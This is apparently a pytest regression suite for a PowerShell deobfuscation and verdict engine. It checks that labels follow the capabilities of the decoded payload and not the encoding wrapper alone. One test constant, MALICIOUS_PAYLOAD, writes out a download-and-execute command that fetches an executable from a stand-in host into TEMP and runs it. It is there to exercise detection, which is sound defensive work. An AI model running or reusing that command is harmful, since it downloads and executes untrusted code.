"""PR-2.1 · Canonical Artifact Consistency Hotfix regression tests.

Guards the invariants set by ARB Governance Rules 12 and 13:

  * Rule 12: every downstream consumer reads the same canonical artifact.
  * Rule 13: verdicts are driven by decoded capabilities, not by the
    presence of an obfuscation / encoding technique alone.

Reference cases (from the ARB decision):

  Case A · benign wrapper + benign payload  → Informational · caps ≤ 30%
  Case B · benign wrapper + malicious payload → Suspicious or Malicious

The wrapper is identical in both — only the decoded payload's
capabilities determine the label. This is the whole point of the rule.
"""
from __future__ import annotations

import base64

import pytest


# ---------------------------------------------------------------------------
# Reusable helpers
# ---------------------------------------------------------------------------


def _encoded_command(script: str) -> str:
    """PowerShell -EncodedCommand format: base64 of UTF-16LE."""
    return base64.b64encode(script.encode("utf-16-le")).decode()


BENIGN_PAYLOAD = 'Write-Host "This comes from an encoded PS command!"'
MALICIOUS_PAYLOAD = (
    'Invoke-WebRequest http://evil.example/payload.exe '
    '-OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe'
)


# ---------------------------------------------------------------------------
# Rule 13 · label logic (unit level, no HTTP)
# ---------------------------------------------------------------------------


def _make_contrib(kind: str, ec: str):
    """Build a minimal VerdictContribution stub for the label tests."""
    from nivxforge.investigation.verdict_engine import VerdictContribution
    return VerdictContribution(
        node_id=f"META-test-{kind}",
        kind=kind,
        weight=1.0,
        confidence=0.9,
        evidence_class=ec,
    )


def test_rule13_wrapper_only_benign_returns_informational():
    from nivxforge.investigation.verdict_engine import _label_from_class_distribution
    contribs = [_make_contrib("encoded_powershell", "high")]
    assert _label_from_class_distribution(contribs, has_decoded=True) == "Informational"


def test_rule13_wrapper_plus_iex_high_promotes_to_attack_verdict():
    from nivxforge.investigation.verdict_engine import _label_from_class_distribution
    contribs = [
        _make_contrib("encoded_powershell", "high"),
        _make_contrib("invoke_expression", "high"),
    ]
    # invoke_expression is in ATTACK_CHAIN_HIGH → 2 HIGH incl. attack-chain → Malicious
    assert _label_from_class_distribution(contribs, has_decoded=True) == "Malicious"


def test_rule13_wrapper_plus_lolbin_stays_suspicious_not_informational():
    from nivxforge.investigation.verdict_engine import _label_from_class_distribution
    # LOLBIN presence adds a *second* HIGH — not attack-chain — so should
    # remain "Suspicious", NOT downgrade to Informational.
    contribs = [
        _make_contrib("encoded_powershell", "high"),
        _make_contrib("lolbas_usage", "high"),
    ]
    assert _label_from_class_distribution(contribs, has_decoded=True) == "Suspicious"


def test_rule13_no_signals_returns_undetermined():
    from nivxforge.investigation.verdict_engine import _label_from_class_distribution
    assert _label_from_class_distribution([], has_decoded=True) == "Undetermined"


def test_rule13_confidence_cap_matches_label():
    from nivxforge.investigation.verdict_engine import _confidence_cap
    # Wrapper-only → cap 0.30
    contribs = [_make_contrib("encoded_powershell", "high")]
    assert _confidence_cap(contribs) == 0.30
    # Attack-chain HIGH → no cap
    contribs = [
        _make_contrib("encoded_powershell", "high"),
        _make_contrib("shellcode_detected", "high"),
    ]
    assert _confidence_cap(contribs) == 1.0


def test_rule13_medium_non_wrapper_blocks_downgrade():
    """A MEDIUM signal that isn't a wrapper kind must NOT downgrade to
    Informational — the payload has capability we cannot fully rate."""
    from nivxforge.investigation.verdict_engine import _label_from_class_distribution
    contribs = [
        _make_contrib("encoded_powershell", "high"),
        _make_contrib("suspicious_string_pattern", "medium"),
    ]
    assert _label_from_class_distribution(contribs, has_decoded=True) != "Informational"


# ---------------------------------------------------------------------------
# Rule 12 · ps-normalizer canonical artifact
# ---------------------------------------------------------------------------


def test_normalizer_decodes_encoded_command_benign_write_host():
    """ARB reference Case A · benign wrapper + benign payload.
    The normalizer must decode UTF-16LE, promote the decoded payload as
    the canonical Reconstructed Command, and simulate the safe built-in."""
    from decoders.ps_normalizer import op_powershell_normalize

    b64 = _encoded_command(BENIGN_PAYLOAD)
    inp = f"powershell -EncodedCommand {b64}"
    out = op_powershell_normalize(inp, None)
    # New canonical structure: decoded payload IS the reconstructed command
    assert "Reconstructed Command (canonical · post-decode)" in out
    assert "Write-Host" in out
    assert "Runtime Output (Simulation · deterministic)" in out
    assert "This comes from an encoded PS command!" in out
    # Wrapper is retained as evidence, not primary artifact
    assert "Wrapper Evidence" in out
    assert "-EncodedCommand" in out


def test_normalizer_does_not_simulate_malicious_encoded_command():
    from decoders.ps_normalizer import op_powershell_normalize

    b64 = _encoded_command(MALICIOUS_PAYLOAD)
    inp = f"powershell -EncodedCommand {b64}"
    out = op_powershell_normalize(inp, None)
    # Decoded payload is still promoted as canonical
    assert "Reconstructed Command (canonical · post-decode)" in out
    assert "Invoke-WebRequest" in out
    # But no runtime simulation because it isn't a safe built-in
    assert "Runtime Output (Simulation): not attempted" in out


def test_normalizer_malformed_base64_falls_through_gracefully():
    """A corrupted -EncodedCommand payload must not raise — the caller
    downstream is responsible for the decoding error UX."""
    from decoders.ps_normalizer import op_powershell_normalize

    out = op_powershell_normalize("powershell -EncodedCommand !!!bad-base64!!!", None)
    # Should still emit the normalization block; no crash.
    assert "POWERSHELL NORMALIZATION" in out


def test_normalizer_still_handles_plain_command_form():
    """Regression: the pre-existing -Command "..." path must keep working."""
    from decoders.ps_normalizer import op_powershell_normalize

    out = op_powershell_normalize('powershell -Command "Write-Host \\"hi\\""', None)
    # Note: Python-level escaping — the actual command uses PS `` escapes.
    # We just verify no crash and normalizer block is emitted.
    assert "POWERSHELL NORMALIZATION" in out


# ---------------------------------------------------------------------------
# Layer separation (Rule 13 output contract)
# ---------------------------------------------------------------------------


def test_normalizer_output_shows_four_layers_for_benign_case():
    """Rule 13 · The canonical structure surfaces:
    1. Reconstructed Command (post-decode canonical artifact)
    2. Wrapper Evidence (retained for context)
    3. Runtime Output (Simulation)
    4. Behavior claims (evidence-backed)"""
    from decoders.ps_normalizer import op_powershell_normalize

    b64 = _encoded_command(BENIGN_PAYLOAD)
    inp = f"powershell -EncodedCommand {b64}"
    out = op_powershell_normalize(inp, None)
    assert "Reconstructed Command (canonical · post-decode)" in out
    assert "Wrapper Evidence" in out
    assert "Runtime Output (Simulation" in out
    assert "Behavior" in out
    assert "Safe built-in — no malicious behavior" in out


# ---------------------------------------------------------------------------
# Rule 13 · Evidence-backed behavior claims (added after ARB feedback on
# the Auto Investigate output showing "Mixed-case obfuscation" on a
# non-mixed-case input).
# ---------------------------------------------------------------------------


def test_normalizer_does_not_claim_mixed_case_on_normal_input():
    """Regression: benign lowercase `powershell -EncodedCommand ...`
    input must NOT emit `Mixed-case obfuscation` in the Behavior list.
    Claim was unconditional before this fix and misled analysts."""
    from decoders.ps_normalizer import op_powershell_normalize
    b64 = _encoded_command(BENIGN_PAYLOAD)
    out = op_powershell_normalize(f"powershell -EncodedCommand {b64}", None)
    assert "Behavior:" in out
    assert "Mixed-case obfuscation" not in out


def test_normalizer_reports_mixed_case_only_when_observed():
    """When the input actually has mixed-case (`PoWeRsHeLl`), the
    normalizer trace should include mixed-case evidence and the
    Behavior list should surface it."""
    from decoders.ps_normalizer import op_powershell_normalize
    b64 = _encoded_command(BENIGN_PAYLOAD)
    # Force a mixed-case exe token to exercise the trace step.
    out = op_powershell_normalize(f"PoWeRsHeLl -EncodedCommand {b64}", None)
    # At minimum the reconstruction should normalize powershell.exe.
    assert "powershell.exe" in out


def test_normalizer_does_not_claim_comma_obfuscation_when_absent():
    """No comma-splice in the input → no comma-obfuscation Behavior."""
    from decoders.ps_normalizer import op_powershell_normalize
    b64 = _encoded_command(BENIGN_PAYLOAD)
    out = op_powershell_normalize(f"powershell -EncodedCommand {b64}", None)
    assert "Comma-separated token obfuscation" not in out


def test_normalizer_labels_base64_wrapper_for_encoded_command():
    """When the payload was reached via base64 UTF-16LE decoding, the
    Behavior list surfaces the wrapper explicitly (T1027.010)."""
    from decoders.ps_normalizer import op_powershell_normalize
    b64 = _encoded_command(BENIGN_PAYLOAD)
    out = op_powershell_normalize(f"powershell -EncodedCommand {b64}", None)
    assert "Base64 UTF-16LE EncodedCommand wrapper" in out
